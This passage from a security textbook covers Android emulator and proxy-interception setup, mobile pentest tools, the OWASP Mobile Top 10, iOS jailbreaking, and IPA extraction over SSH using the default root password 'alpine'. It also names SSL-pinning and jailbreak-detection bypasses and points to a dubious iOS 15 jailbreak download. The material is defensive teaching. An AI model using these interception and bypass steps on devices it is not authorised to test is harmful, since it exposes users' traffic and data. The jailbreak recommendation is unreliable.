2.  By selecting Next, we will be sent to the next *[Figure 10.30](#c10.xhtml#fig10_30)*, where we will be able to choose the folder in which we want to install this application. All the apps will be installed in the `C:/` drive in our scenario. Refer to *[Figure 10.30](#c10.xhtml#fig10_30):*
    
    ![](images/Figure-10.30.jpg)
    
    **Figure 10.30:** Genymotion installation\_2
    
3.  The installation begins after confirmation, as demonstrated in *[Figure 10.31](#c10.xhtml#fig10_31)*: 
    
    ![](images/Figure-10.31.jpg)
    
    **Figure 10.31:** Genymotion installation\_3
    
4.  Genymotion uses Oracle VirtualBox to execute the emulator, so the system image stays in the virtual box even if the frontend software, that is, Genymotion, is uninstalled. If you did not download Genymotion with VirtualBox, *[Figure 10.32](#c10.xhtml#fig10_32)* will not work for you: 
    
    ![](images/Figure-10.32.jpg)
    
    **Figure 10.32:** Genymotion installation\_4
    
5.  As shown in *[Figure 10.33](#c10.xhtml#fig10_33)*, our downloaded Genymotion file includes the package of a pre-compiled version of Oracle Virtual Box: 
    
    ![](images/Figure-10.33.jpg)
    
    **Figure 10.33:** Oracle virtual box installation
    
6.  Clicking `Next` will force you to install VirtualBox, which will take up some space.
7.  Once Oracle VirtualBox is installed, Genymotion is installed as well, and we are ready to construct our first Android virtual image. Refer to *[Figure 10.34](#c10.xhtml#fig10_34)*: 
    
    ![](images/Figure-10.34.jpg)
    
    **Figure 10.34:** Genymotion installation\_5
    

# [Creating an Android virtual emulator](#toc.xhtml#s186a)

Now that we have got Genymotion and Oracle VirtualBox set up, we will go ahead and make a new Android Virtual Emulator, which we will use to run a variety of tests. The steps to set up an emulator in Genymotion are as follows:

1.  When you first run Genymotion, you will see a popup for the usage notice, followed by an alert to build a virtual device, as shown in *[Figure 10.35](#c10.xhtml#fig10_35)*: 
    
    ![](images/Figure-10.35.jpg)
    
    **Figure 10.35:** Genymotion
    
2.  By selecting `Yes`, the next choice will direct us to our Genymotion Cloud account, as shown in *[Figure 10.36](#c10.xhtml#fig10_36)*: 
    
    ![](images/Figure-10.36.jpg)
    
    **Figure 10.36:** Genymotion cloud account
    
3.  After logging in, we can examine all the available Android photos and then click `Next`.
4.  By selecting `Following`, we will proceed to the next step, where we will enter the name of the emulator we will create. We will call it Google Nexus—Penetration Testing Device in this case, as shown in *[Figure 10.37](#c10.xhtml#fig10_37)*: 
    
    ![](images/Figure-10.37.jpg)
    
    **Figure 10.37:** Genymotion Google Nexus Device
    
5.  Because Genymotion uses hardware-based acceleration, we may need to configure several processors during the installation process. As demonstrated in the following *[Figure 10.38](#c10.xhtml#fig10_38)*, we are using one processor for the basic setup: 
    
    ![](images/Figure-10.38.jpg)
    
    **Figure 10.38:** Genymotion device settings
    
6.  We are ready to use the device now that we have finished setting up the first Android virtual emulator by pressing `Start`.
7.  Finally, our virtual device should be visible, as shown in *[Figure 10.39](#c10.xhtml#fig10_39)*: 
    
    ![](images/Figure-10.39.jpg)
    
    **Figure 10.39:** Genymotion device start
    

An ADB devices command can be used to confirm this, as shown in *[Figure 10.40](#c10.xhtml#fig10_40)*:

![](images/Figure-10.40.jpg)

**Figure 10.40:** ADB devices command

In some circumstances, as demonstrated in *[Figure 10.41](#c10.xhtml#fig10_41)*, we may receive the trigger for an error message, which can be resolved by enabling Intel Virtualization Technology, or Intel VT-x, in the BIOS:

![](images/Figure-10.41.jpg)

**Figure 10.41:** Virtualization technology message

# [Installing an application to the Genymotion emulator](#toc.xhtml#s187a)

Installing an application to the emulator can be done in one of two ways: either by downloading it or by using ADB to install one made by developers: `ADB install appname.apk`.

You can also drag and drop an APK file directly into the emulator, as illustrated in *[Figure 10.42](#c10.xhtml#fig10_42)*:

![](images/Figure-10.42.jpg)

**Figure 10.42:** Drag and drop APK file

# [Installing the Genymotion plugin to Android Studio](#toc.xhtml#s188a)

If the app developers are writing the code in Android Studio and are unable to immediately test their apps using the Android emulator, it is really challenging. Instead, users wind up installing the software after signing it in each time.

The following actions must be taken to enable Genymotion VMs in Android Studio:

1.  Navigate to `Android Studio`. Go to `Settings` and select `Plugins`.
2.  In the screen capture as follows, find `genymotion`, right-click on it, and then choose `Download and Install`. Refer to *[Figure 10.43](#c10.xhtml#fig10_43):*
    
    ![](images/Figure-10.43.jpg)
    
    **Figure 10.43:** Genymotion plugin
    
3.  Launch Android Studio again. Android Studio has the Genymotion device manager installed. To make starting an application easier, set the application path to Genymotion by going to `File` | `Settings` | `Other Settings` | `Genymotion`, as seen in *[Figure 10.44](#c10.xhtml#fig10_44)*: 
    
    ![](images/Figure-10.44.jpg)
    
    **Figure 10.44:** Genymotion plugin setting
    
4.  The Genymotion device manager has now been successfully installed. We are prepared to create and launch the app on the device. Refer to *[Figure 10.45](#c10.xhtml#fig10_45):*
    
    ![](images/Figure-10.45.jpg)
    
    **Figure 10.45:** Genymotion device manager
    

# [ARM apps and play store in Genymotion](#toc.xhtml#s189a)

Only ARM-based hardware can execute some applications. We can add a specific package to address this issue by obtaining ARM translation from **https://docs.google.com/file/d/0B-p1r5SNN4adcmhtaGdMVml0Qzg/edit** in order to prevent app crashes, which notably make use of these ARMs.

As you can see in *[Figure 10.46](#c10.xhtml#fig10_46)*, simply drag and drop the ZIP file onto the emulator. Additionally, keep in mind that the bundles will vary depending on the Android platform. Refer to *[Figure 10.46](#c10.xhtml#fig10_46)*:

![](images/Figure-10.46.jpg)

**Figure 10.46:** Drag and drop zip file

For that, we must download the gapps-lp-20141109-signed.zip file from **[https://www.androidfilehost.com?fid=95784891001614559](https://www.androidfilehost.com?fid=95784891001614559)** and then drag and drop it onto the virtual device to install Google Play Store.

After both apps have been installed, restart the device, and you should see Play Store installed in our Genymotion emulator, as shown in *[Figure 10.47](#c10.xhtml#fig10_47)*:

![](images/Figure-10.47.jpg)

**Figure 10.47:** Install Google Play Store

We can browse all the compatible apps in the store thanks to Play Store being available on the emulator. This will be incredibly helpful if you are conducting a black box analysis.

# [Configuring the emulator for HTTP proxy](#toc.xhtml#s190a)

Here, we are assuming two test cases: first, an Android emulator from Genymotion with a Wi-Fi connection, and second, an internet-connected LTE/3G/2G device. Even in the actual device, this will be the same.

Let us have a look at the various proxy tools that are available before we start configuring the emulator for proxies. These include, but are not limited to, the following:

*   **Burp Suite:** The majority of penetration testers choose this proxy, which can be downloaded from **[https://portswigger.net/burp/download.html](https://portswigger.net/burp/download.html)**. There are two editions: one is free, and another is intended for commercial usage. The commercial edition offers a variety of options, including scanners, among others.
*   **Paros Proxy:** This open-source Java-based proxy was created specifically to look for weaknesses in Web applications. From **[https://sourceforge.net/projects/paros/files/](https://sourceforge.net/projects/paros/files/)**, you can download it. It was replaced by OWASP ZAP because it was not updated enough. You can still use this proxy as a backup, though.
*   **OWASP ZAP:** This is a vulnerability discovery tool that is open source and integrated. From **[https://github.com/zaproxy/zaproxy/wiki/Downloads](https://github.com/zaproxy/zaproxy/wiki/Downloads)**, you can download it.

There are several additional tools that can be investigated, such as Context Application Tool, ProxyFuzz, Odysseus proxy, Fiddler, and others.

There are two ways to intercept the data flow between the device and the server:

*   Setting up the proxy in Wi-Fi settings.
*   Setting up the proxy in mobile carrier settings.

# [Setting up the proxy in Wi-Fi settings](#toc.xhtml#s191a)

Assume that the device can only connect to Wi-Fi and does not have the capacity to use a SIM card:

1.  Go to `Settings` **|** `Wi-Fi` and choose the currently connected Wi-Fi. After 30 seconds, hang in there to view the choices depicted in *[Figure 10.48](#c10.xhtml#fig10_48)*: 
    
    ![](images/Figure-10.48.jpg)
    
    **Figure 10.48:** WIFI setting
    
2.  Navigate to `Modify Network` | `Advanced Option` | `Proxy` | `Manual`.
3.  Enter the IP address of your proxy; in this instance, Burp Suite is running on port `8080` at `192.168.2.1`. Refer to *[Figure 10.49](#c10.xhtml#fig10_49):*
    
    ![](images/Figure-10.49.jpg)
    
    **Figure 10.49:** Proxy IP address and proxy port setting
    
4.  The Wi-Fi has been set up effectively to intercept the proxy. We can see from the Burp Proxy *[Figure 10.50](#c10.xhtml#fig10_50)* that we can eavesdrop on HTTP Web traffic: 
    
    ![](images/Figure-10.50.jpg)
    
    **Figure 10.50:** Burp suite
    

If you want the device to be accessible over the network, you can change the settings to Bridge Mode by opening the Oracle Virtual Box and selecting `Name of the` `VM` **|** `Settings` **|** `Network` **|** `Adapter 2` **|** `Change the NAT to Bridged`. By default, Genymotion configures the Network Adapter settings in the Oracle Virtual Box to NAT.

# [Setting up the proxy on mobile carrier settings](#toc.xhtml#s192a)

Let us assume that the Android device can connect to Wi-Fi and a SIM card:

1.  Click `Settings` **|** `More` **|** `Cellular networks` **|** `APN` **|** As seen in *[Figure 10.51](#c10.xhtml#fig10_51)*, choose the APN you want to edit: 
    
    ![](images/Figure-10.51.jpg)
    
    **Figure 10.51:** APN setting
    
2.  Set the IP address of your proxy and the port number.
3.  You have configured the device to connect to your proxy.

Many features, including screen capture, phone options, the virtual device version, and others, are not available in Genymotion’s free edition for personal use.

# [Android penetration testing tools](#toc.xhtml#s193a)

There are many tools available for Android penetration testing, but let us look at the top six that are frequently used:

1.  **Android Debug Bridge (ADB)**: A command-line tool called **Android Debug Bridge** (**ADB**) is used to interact with devices. The application can be installed, debugged, backed up, and data can be pushed to or pulled from the device, among other device functions. Refer to *[Figure 10.52](#c10.xhtml#fig10_52):*
    
    ![](images/Figure-10.52.jpg)
    
    **Figure 10.52:** ADB tool
    
2.  **MobSF: Mobile Security Framework** (**MobSF**) is an automated, all-in-one mobile application Pentesting framework that can do static, dynamic, and malware analysis on mobile applications running on Android, iOS, and Windows. It supports binaries (APK, IPA, and APPX) as well as zipped source code and can be used for efficient and quick security analysis of Android, iOS, and Windows mobile applications. Additionally, MobSF has the ability to test an application dynamically, as shown in *[Figure 10.53](#c10.xhtml#fig10_53).* MobSF can be downloaded from **[https://github.com/MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)**: 
    
    ![](images/Figure-10.53.jpg)
    
    **Figure 10.53:** MobSF tool
    
3.  **Drozer:** MWR Labs created Drozer, a thorough security and attack framework for Android. You can communicate with the underlying OS, the Dalvik VM, and other programmers’ IPC endpoints, as shown in *[Figure 10.54](#c10.xhtml#fig10_54).* Drozer can be downloaded from **[https://github.com/FSecureLABS/drozer](https://github.com/FSecureLABS/drozer)**: 
    
    ![](images/Figure-10.54.jpg)
    
    **Figure 10.54:** Drozer tool
    
4.  **d2j-dex2jar:** It is a tool for working with `.dex` and `.jar` files for Android. This facilitates `.dex` file to .class file conversion (zipped jar files), as shown in *[Figure 10.55](#c10.xhtml#fig10_55).* D2J-Dex2jar can be downloaded from **[https://github.com/pxb1988/dex2jar](https://github.com/pxb1988/dex2jar)**: 
    
    ![](images/Figure-10.55.jpg)
    
    **Figure 10.55:** d2j-dex2jar tool
    
5.  **JD-GUI:** JD-GUI is a stand-alone graphical tool that shows the class files’ Java source code, as shown in *[Figure 10.56](#c10.xhtml#fig10_56).* JD-GUI can be downloaded from **[https://github.com/java-decompiler/jd-gui](https://github.com/java-decompiler/jd-gui)**: 
    
    ![](images/Figure-10.56.jpg)
    
    **Figure 10.56:** JD-GUI tool
    
6.  **Objection:** Frida-powered Objection is a runtime mobile exploration toolkit, as shown in *[Figure 10.57](#c10.xhtml#fig10_57)*. Without requiring a jailbroken or rooted mobile device, it was designed to assist in evaluating mobile applications and their security posture. This tool’s features include the following: 
    
    *   Bypassing SSL pinning and Root detection
    *   Remove Android Heap and Keystore
    *   Tracks the copy/paste buffer cache on Android
    *   Hook one or more runtime methods of a class
    *   Run unique Frida scripts
    *   Use Android intents where necessary
    
    You can get it from **[https://github.com/sensepost/objection](https://github.com/sensepost/objection)**:
    
    ![](images/Figure-10.57.jpg)
    
    **Figure 10.57:** Objection tool
    

# [Secure android applications](#toc.xhtml#s194a)

For app developers that want to construct safe apps, the OWASP mobile top 10 list is an excellent reference. This is due to the fact that many mobile apps are naturally open to security vulnerabilities. Let us consider a handful of assaults against mobile apps that have happened in recent years. There was Pegasus spyware for WhatsApp, which gave attackers access to users’ smartphones. Another was the assault on the Pokémon Go app, which was vulnerable to reverse engineering by users who wanted to catch more Pokémon.

Numerous additional applications and businesses, such as Tinder and MediaTek, have experienced mobile security assaults. But why are they so defenseless? As mobile apps can be downloaded from public shops and the code can be examined, they have a larger attack surface than Web apps. Together with the volume of user data they can gather, this makes us highly alluring targets for hackers.

The most prevalent security weaknesses discovered on mobile devices are listed in the OWASP mobile top 10 vulnerabilities. But what vulnerabilities are listed on the OWASP mobile security list?

# [OWASP mobile top 10 vulnerabilities](#toc.xhtml#s195a)

The open Web application Security Project foundation presented the OWASP mobile security risks for the first time in 2011 based on comments and survey data gathered from the global community. Following that, additional lists were published in 2014 and 2016; the latter is the most recent and up-to-date OWASP mobile top 10 list.

While there is one precise carryover from the top 10 mobile dangers list from 2014, the categories for the 2016 list are primarily different. For instance, two new dangers were added to the 2016 list while removing one item from the 2014 list. Additionally, they divided several categories into two to be addressed separately. Refer to *[Figure 10.58](#c10.xhtml#fig10_58)*:

![](images/Figure-10.58.jpg)

**Figure 10.58:** A side-by-side comparison of OWASP 2014 and 2016 mobile risks

In light of this, let us examine the 10 mobile dangers that were ultimately selected in 2016 and consider how you might address these risks.

# [Improper platform usage](#toc.xhtml#s196a)

Improper platform usage is ranked as the top mobile security vulnerability in the most recent OWASP mobile top 10 ranking. Whether you use Android or iOS, each of these platforms is expected to follow specific development standards for security reasons. Apps may, however, unintentionally transgress these best practices and established recommendations or make mistakes during their implementation. This initial mobile security risk focuses on that.

The exploitation of any platform functionality of the Android or iOS operating system or the disregard for platform security rules are considered threats. This includes concerns with the erroneous usage of platform elements and security controls that are a part of the mobile operating system, such as:

*   Unauthorized access to the device may come through misuse of the iOS Touch ID function.
*   Using the iOS Keychain incorrectly, such as by keeping session keys in the app’s local storage.
*   Requesting too many or the incorrect platform permissions.
*   Android intents that are marked public may leak sensitive information or allow unauthorized execution (used to request an action from another app component).

**Remediation measures for this vulnerability:**

You need to take care of this OWASP mobile security issue on the server end of things. Using secure coding techniques and implementing the proper configuration settings on the server side, in addition to adhering to platform development rules, reduces risks. The following are some additional mitigation measures to stop platforms from being misused:

*   Restricting access, implementing restrictive file permissions, preventing apps from interacting with one another, and so on.
*   Applying the most stringent protection class for iOS keychains and following recommended practices to prevent shoddy control implementation

# [Insecure data storage](#toc.xhtml#s197a)

Insecure data storage comes in second on the OWASP mobile top 10 lists. It is possible for your mobile device to disappear or be stolen and end up in the hands of an enemy. Or the attacker might use malware that runs on the device and acts on their behalf to exploit flaws that let personal information leak and give them access to sensitive data.

Although it is not always possible to create apps that do not save data, it is essential to do it safely and, in a location, where neither another app nor a person would be able to access it. Dev teams must never assume that attackers will not have access to filesystems if they are readily available. Jailbreaking or rooting a mobile device is sufficient to get around encryption security.

**Remediation measures for this vulnerability:**

To comprehend what information assets are processed by the application and how the APIs handle the data, the threat model the app. By doing this, you can:

*   Analyze the effectiveness of the encryption process and the security of the encryption keys.
*   Implement technologies, such as buffer overflow protection and obfuscation, to harden the code against tampering.
*   Wherever possible, avoid caching or storing data.
*   Implement reliable authorization and authentication checks.

# [Insecure communication](#toc.xhtml#s198a)

In the OWASP mobile top 10 list for 2016, insecure communication comes in third. Anyone keeping an eye on the network can intercept and read all the information being transferred over the wire if the data is sent in cleartext and unencrypted.

Client-server data interchange is ubiquitous in mobile apps, and this data must be securely delivered through the device’s carrier network and the internet. Cell towers, proxies, spyware installed on your device, or an enemy compromising your Wi-Fi can all intercept the traffic. What can you do, then, to lessen the risks involved in this kind of data exchange?

**Remediation measures for this vulnerability:**

*   Use industry-standard encryption techniques and other general best practices to prevent data theft as it moves across the network.
*   To secure all communication channels, use SSL/TLS certificates issued by reputable **certificate authorities** (**CA**).
*   If an incorrect SSL/TLS certificate is found or if the certificate chain verification process is unsuccessful, notify users.

# [Insecure authentication](#toc.xhtml#s199a)

The next vulnerability on the OWASP list for mobile security is insecure authentication. Mobile apps must confirm the user’s identity prior to allowing access. A common method of executing an authentication bypass is to take advantage of known flaws, such as faulty service request validation carried out by the backend server of the mobile app. Particularly when transmitting sensitive data, such as banking information, mobile apps need to confirm, and maintain user identity.

**Remediation measures for this vulnerability:**

An attacker may take advantage of holes in the mobile app authentication system. By taking advantage of those flaws, they can get around password restrictions or obtain more permissions, which can result in data theft and other harm.

So, what can you do to stop it?

*   Do not use local authentication techniques. Place this responsibility on the server side instead and only download application data upon successful authentication.
*   Avoid using weak authentication techniques (such as device identity), avoid storing passwords locally, use **multi-factor authentication** (**MFA**), forbid using the entire four-digit PIN as a password, and so on.

# [Insufficient cryptography](#toc.xhtml#s200a)

A system’s cryptography may be broken in one of two circumstances, exposing sensitive information:

*   It is possible that the fundamental encryption and decryption algorithm is insecure, or
*   There are implementation problems with the cryptography process itself.

Mobile apps with broken cryptography may be the consequence of a number of different things. The following are some of these possible causes:

*   bypassing the encryption techniques incorporated within the code,
*   managing your digital keys improperly, and
*   using non-standard or outdated encryption techniques.

**Remediation measures for this vulnerability:**

Inadequate cryptographic safeguards may enable unauthorized access to sensitive data (such as the user’s personal information) stored on the device.

*   Use the **National Institute of Standards and Technology’s** (**NIST**) recommended strong cryptographic standards.
*   When possible, avoid storing any sensitive information on the device.

# [Insecure authorization](#toc.xhtml#s201a)

Users are not all created equally! Although some users only need the basic permissions and capabilities, others, like admin users, may need more. Poor authorization protocols do not check the user’s identity or authority to access the requested resources. Hackers are able to log in as authorized users and conduct privilege escalation attacks because identification policies and the rights granted to users are not effectively enforced.

**Remediation measures for this vulnerability:**

Similar to insecure authentication, unsecured authorization has negative effects. Both of them carry the risk of data loss, harm to one’s reputation, and potential noncompliance fines and penalties.

*   Make sure that the backend processes for each request check to see if the incoming identifiers linked to an identity match and genuinely belong to the identity.
*   Use data from backend systems to validate a user’s roles and permissions rather than relying just on data from the user’s mobile device.

# [Client code quality](#toc.xhtml#s202a)

This section of the OWASP mobile security threats list is sort of a catch-all for problems with mobile clients caused by bad code implementations.

An attacker may send specially created inputs to function calls made within an app in an effort to run them or track the activity of the program. It might result in decreased speed, more memory consumption, and so on. Because they occur on the mobile client and are distinct from coding errors that occur on the server, the coding errors must be corrected locally. Mobile apps may contain errors at the code level that might result in problems like:

*   Format-string vulnerabilities.
*   Buffer overflows.
*   Integration with insecure third-party libraries.
*   Remote code execution.

Many apps rely on third-party libraries, which frequently have problems and are not thoroughly tested, to create their applications. Since they do not own the code, these problems are beyond the developer’s control. Rewriting portions of the code now being executed on the device is the most common solution for code-level issues. What else can you do, though?

**Remediation measures for this vulnerability:**

Remote code execution and other vulnerabilities and problems that we have already highlighted can result from poor code quality issues. Fortunately, there are a few things you may do to lessen these problems:

*   Use automated tools to check for memory leaks, buffer overflows, and other issues. Rely on source code reviews. Write clear, well-documented code.
*   Use consistent coding patterns across the organization.

# [Code tampering](#toc.xhtml#s203a)

Modified versions of mobile apps can occasionally be found in app stores. A modified program is one where a hacker changes the binary to add harmful code, set up a backdoor, and so on. Attackers have the ability to re-sign these fake apps and upload the updated version to other app stores. In order to mislead a victim into downloading the software, they can also deliver to them directly via a phishing attack.

**Remediation measures for this vulnerability:**

Modifying the code can result in financial losses, identity theft, reputational harm, and other problems.

*   If more code has been added or modified, the app must be able to recognize any code integrity violations and respond appropriately to them when they occur. Users may be informed about code changes by using a tool like a code signing certificate.
*   Utilize anti-tamper techniques to disable the execution of unauthorized apps by using checksums, digital signatures, code hardening, and other validation approaches.

# [Reverse engineering](#toc.xhtml#s204a)

Attackers might decompile and reverse engineer the app to analyze its source code. This is especially risky as the attacker may comprehend, examine, and edit the code to introduce destructive functionality or transmit unwanted adverts. They can edit the software using tools like IDA Pro, Hopper, and other binary inspection tools once they have a basic understanding of how it functions. They can recompile and launch the software once they have got it to behave as they want.

**Remediation measures for this vulnerability:**

The attacker must be unable to de-obfuscate the code using tools like IDA Pro and Hopper in order to prevent reverse engineering.

# [Extraneous functionality](#toc.xhtml#s205a)

Mobile app developers occasionally mistakenly include features or backdoors that are hidden from consumers via the user interface. These items might be put into use in a production setting with a feature that was not meant to be there, posing a security risk.

Hackers can often take advantage of these flaws in their systems without the assistance of regular users. They may look through configuration files, analyze the binaries, and other things to find features of the backend system that hackers can use to launch an attack.

**Remediation measures for this vulnerability:**

Manual secure code review is one of the best approaches to stop these kinds of mobile app vulnerabilities. This makes it possible for you to:

*   Check the configuration settings of the mobile app to look for any concealed switches.
*   Make sure the logs do not contain assertions about the backend systems that are overly informative.

# [Conclusion](#toc.xhtml#s206a)

After reading this chapter, the reader will understand Android Architecture, and will learn how to set up Android Penetration Testing Environment and know the popular Android Penetration Testing Tools. Finally, the reader can learn how to protect their Android Applications, based on OWASP TOP 10. In the upcoming chapter, we will learn about iOS penetration testing as another popular mobile operating system.

# [Questions](#toc.xhtml#s207a)

1.  Mention four native libraries that are found in Android architecture.
2.  Mention two native applications that are found in Android architecture.
3.  Mention three popular Android penetration testing tools.
4.  Mention four of OWASP’s Top 10 vulnerabilities for Android.

# [CHAPTER 11](#toc.xhtml#c11)

# [iOS Penetration Testing](#toc.xhtml#c11)

# [Introduction](#toc.xhtml#s208a)

The mobile application’s penetration testing involves Android and iOS, two key market players. Both operating systems are widely used and come with unique features.

In this chapter, we will examine the iOS platform and how to begin penetration testing on an iOS application. We will begin by going over the fundamentals of the iOS application and some key information, then go on to the necessary tools, lab setup, and some simple attacks.

While evaluating the API requests coming from an iOS application is like standard API penetration testing procedures. The primary distinctions are between static and dynamic functional analysis, circumventing established limitations, manipulating functions, and other amazingly intriguing things.

# [Structure](#toc.xhtml#s209a)

The following topics will be covered in this chapter:

*   Basics of iOS application
*   iOS application Sandbox structure
*   Vulnerable application
*   Testing methodology
*   OWASP mobile top 10

# [Objectives](#toc.xhtml#s210a)

In this chapter, you will be able to understand the basics of iOS applications, then learn iOS application sandboxing structure and know the popular iOS penetration testing tools. Finally, you will learn the testing methodology of the iOS application.

# [Basics of iOS application](#toc.xhtml#s211a)

Understanding the iOS platform, its built-in security features, and other key terms is crucial before starting with iOS application penetration testing. Now, we will go over some key phrases in the simplest, quickest way we can, then suggest additional reading to fully examine them.

# [Architecture of iOS](#toc.xhtml#s212a)

The iOS system’s basic architecture is shown in *[Figure 11.1](#c11.xhtml#fig11_1)*, where multiple layers are used to create communication and carry out various functions between the application and hardware levels:

![](images/Figure-11.1.jpg)

**Figure 11.1:** iOS architecture

Let us briefly go through a few of these layers:

*   **Core OS**: Numerous low-level functionalities are provided by the Core OS layer, upon which various services are constructed. These include Accelerate Framework, Directory Services, System Configuration, OpenCL, and so on.
*   **Core services**: Over the services offered in the Core OS layer, the core services layer offers an abstraction. These services generally include Address Book, Social, Security, Webkit, and so on.
*   **Media**: The device can use a variety of media services provided by the media layer, which essentially makes all audio-visual technologies possible. It provides various functions such as Core Image, Core Audio, Core Text, and so on.
*   **Cocoa touch (application)**: The application layer is another name for the cocoa touch layer. It is the top layer in the architecture and exposes several APIs for creating iPhone-compatible software.

The file extension for iOS applications is `.IPA`.

# [File structure of an IPA](#toc.xhtml#s213a)

To begin, we must rename the IPA file to have the .zip extension so that we may unzip it and analyze its structure. The contents are as follows when we unzip it:

*   `App binary`: The executable file containing the compiled (unreadable) application source code.
*   `Info.plist`: The `info.plist` file uses a list of different characteristics to describe the application to the operating system. When conducting security assessments, we frequently scan this file because it might provide valuable information or point out some configuration errors.
*   `Frameworks`: List of dynamic libraries.
*   `Embedded.mobileprovsion`: These are certificates.
*   `Keychain`: An application can keep sensitive information in a keychain that is encrypted and can only be accessed by other applications with permission. View More: **[https://developer.apple.com/documentation/security/keychainservices](https://developer.apple.com/documentation/security/keychainservices)**.

Refer to *[Figure 11.2](#c11.xhtml#fig11_2):*

![](images/Figure-11.2.jpg)

**Figure 11.2:** IPA file structure

# [iOS application Sandbox structure](#toc.xhtml#s214a)

So, how do applications work once they are installed on iOS? Because of Apple’s sandboxing, applications can create local databases on the aforementioned device. They are kept apart from other apps because of this. Because there will be a lot of programs storing data on the device’s hard drive, iOS gives each app its own sandbox to avoid conflicts. Refer to *[Figure 11.3](#c11.xhtml#fig11_3):*

![](images/Figure-11.3.jpg)

**Figure 11.3:** Sandboxing in iOS

The iOS device has three different types of sandboxes as follows:

*   **Pre-installed App directory —** `/var/Application`
    
    The app files for the applications that are pre-installed by default on the iOS device are kept in this directory. Refer to *[Figure 11.4](#c11.xhtml#fig11_4):*
    
    ![](images/Figure-11.4.jpg)
    
    **Figure 11.4:** Pre-installed applications
    
*   **Bundle directory —** `/var/containers/Bundle/Application`
    
    The `Bundle` directory houses all of the files that are downloaded with apps from the Apple App Store often referred to as the `IPA Container`. Additionally downloaded from other places. This directory’s contents will not change as an application version changes. Refer to *[Figure 11.5](#c11.xhtml#fig11_5):*
    
    ![](images/Figure-11.5.jpg)
    
    **Figure 11.5:** Bundle directory applications
    
*   **Data directory -** `/var/mobile/Containers/data/Application`
    
    The developer stores files they want to maintain in the `Data` directory also called the `Local Data Storage Container`. When the application is installed on the device, these are things that are related to it. Files that could be used as a cache for information to be accessed quickly or as a backup for offline data to be used when the application is reopened. Refer to *[Figure 11.6](#c11.xhtml#fig11_6):*
    
    ![](images/Figure-11.6.jpg)
    
    **Figure 11.6:** Data directory applications
    

# [Jailbreak](#toc.xhtml#s215a)

The process of removing the company-imposed user limitations on your device is known as “jailbreaking.” It is crucial to be aware that Jailbreak violates your device’s warranty. Different jailbreaking techniques exist for iOS, depending on the version. A useful website for suggesting jailbreak tools depending on the iOS application is **[https://canijailbreak.com](https://canijailbreak.com)**. It is important to note that jailbreaking can be carried out on Windows, Mac, or Linux systems. Additionally, there are other categories of jailbreaking, which are described as follows:

*   **Untethered Jailbreak**: Permanent Jailbreak, the device will be jailbroken even after a reboot
*   **Tethered Jailbreak**: Temporary Jailbreak, after a reboot device, will be back to its normal state.
*   **Semi-tethered Jailbreak**: The device can boot up independently after a semi-tethered jailbreak, but it will no longer have a patched kernel and will not be able to execute modified code.
*   **Semi-untethered Jailbreak**: In that, it enables the device to start up on its own, a semi-untethered jailbreak is similar to an untethered jailbreak. Each time a device starts, the startup procedure remains the same, and it enters its default, non-jailbroken state. However, the user can re-jailbreak their cellphone using an app that runs on their device rather than a computer, as in a tethered or semi-tethered situation.

The jailbreak procedure is straightforward and takes 2 to 5 minutes. The following tools can be used to jailbreak specific iOS versions. Refer to *[Figure 11.7](#c11.xhtml#fig11_7):*

![](images/Figure-11.7.jpg)

**Figure 11.7:** Jailbreak tools

**Jailbreak provides a tool for IOS version 15, and the higher is Zeon. You can download it from [https://zeon-app.com/](https://zeon-app.com/) to set up the environment.**

The tools, scripts, and applications needed to begin learning iOS applications will be covered in this part. Please be aware that there are numerous tools and scripts available. This article may not cover all of them; thus, it is advised that you investigate each one independently.

Be aware that testing iOS applications are advised to be done on a physical device. I use a variety of iPhone 7 and iPhone 12 mini devices. Additionally, make sure the auto-updates are off to prevent acquiring the most recent version while you wait for a jailbreak.

A virtual device can be obtained by visiting **[https://www.corellium.com/](https://www.corellium.com/)**.

# [Vulnerable application](#toc.xhtml#s216a)

Use the following vulnerable applications and install them in the designated repositories by following the instructions provided:

*   **DVIA-v2**: **[https://github.com/prateek147/DVIA-v2i](https://github.com/prateek147/DVIA-v2i)**
*   **GOAT**: **[https://github.com/OWASP/igoat](https://github.com/OWASP/igoat)**. We will be using the DVIA-v2 application.

# [Testing methodology](#toc.xhtml#s217a)

When doing a penetration test on an iOS application, several elements are involved. Static analysis using manual methods and tools like MobSF is one of the components. Another element involves runtime exploitation, which entails hooking various methods and objects to get around obstacles and obtain sensitive data. Testing the dynamic API calls, such as login API requests and others, that the application generates last.

In order to extract the IPA from the iOS application, we will first run a static analysis on it using MobSF. Then, we will examine a number of bypassing techniques, such as the Jailbreak Detection Bypass, SSL Pinning Bypass, Local Authentication Bypass, and so on.

# [Extracting the IPA](#toc.xhtml#s218a)

There are many ways to extract the IPA file; however, for the purposes of this essay, we will use SSH.

The steps to extract the IPA are as follows:

1.  SSH connection to your iPhone: `ssh root@ip` (Default Password is Alpine)
2.  Go to the directory listed here: `/var/containers/Bundle/Application`
3.  Now look for the application: `find | grep “app_name`”
4.  Go to the folder where your app is located: `cd <app_directory>`
5.  Make a directory called `Payload`: `mkdir Payload`
6.  Transfer the data to the `Payload` directory: `cp -r <appname.app>/ Payload/`
7.  IPA-format the `Payload` directory after zipping it: `zip -r /var/root/<appname>.ipa Payload/`

# [Running static analysis with MobSF](#toc.xhtml#s219a)

MobSF static analysis comes after the extraction of the IPA file. Despite the fact that you can use an install or any other available installation technique, we will be using the MobSF docker option.

*   **MobSF**: **[https://github.com/MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)**
*   **MobSF Documentation**: **[https://mobsf.github.io/docs/#/](https://mobsf.github.io/docs/#/)**

To perform the static analysis, follow the given steps:

1.  Run the MobSF Web interface
2.  Drop the IPA file and run the static analysis
3.  Once the static analysis is complete, search for configuration errors, such as:  
    1.  Insecure URL schemes, as shown in *[Figure 11.8](#c11.xhtml#fig11_8)*: 
        
        ![](images/Figure-11.8.jpg)
        
        **Figure 11.8:** Insecure URL schemes
        
    2.  Insecure permissions and ATS misconfiguration, as shown in *[Figure 11.9](#c11.xhtml#fig11_9)*: 
        
        ![](images/Figure-11.9.jpg)
        
        **Figure 11.9:** Insecure permissions
        
    3.  Insecure binary options, as shown in *[Figure 11.10](#c11.xhtml#fig11_10)*: 
        
        ![](images/Figure-11.10.jpg)
        
        **Figure 11.10:** Insecure binary options
        
    4.  Firebase database, hardcoded information, and e-mails, as shown in *[Figure 11.11](#c11.xhtml#fig11_11)*: 
        
        ![](images/Figure-11.11.jpg)
        
        **Figure 11.11:** Firebase database, e-mails, and hardcoded information
        
